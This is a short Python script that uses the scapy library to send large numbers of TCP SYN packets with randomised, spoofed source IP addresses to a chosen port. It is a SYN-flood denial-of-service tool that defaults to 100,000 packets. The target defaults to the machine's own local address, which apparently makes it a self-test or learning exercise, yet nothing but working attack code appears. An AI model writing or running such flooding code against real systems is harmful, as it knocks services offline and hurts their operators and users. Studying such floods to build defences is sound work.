from scapy.all import *

def get_ip_addr():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_address = s.getsockname()[0]
    s.close()
    return ip_address

target_ip = get_ip_addr()
print("Target IP address:", target_ip)

target_port = 8000

porty = input("Would you like to set the port number (default port: 8000)? y/n: ")
if porty.lower() == "y":
    target_port = int(input("Enter the desired port number: "))
    print("Port set to:", target_port)

packet_num = 100000
packet_numy = input("Would you like to set the packet number (default: 100000)? y/n: ")
if packet_numy.lower() == "y":
    packet_num = int(input("Enter the desired packet number: "))
    print("Packet number set to:", packet_num)

for i in range(packet_num):
    ip = IP(src=RandIP(), dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * 1024)
    packet = ip / tcp / raw
    send(packet, verbose=False)

    print(f"Sent {i+1} SYN packets to {target_ip}:{target_port}.")

print("Completed!")
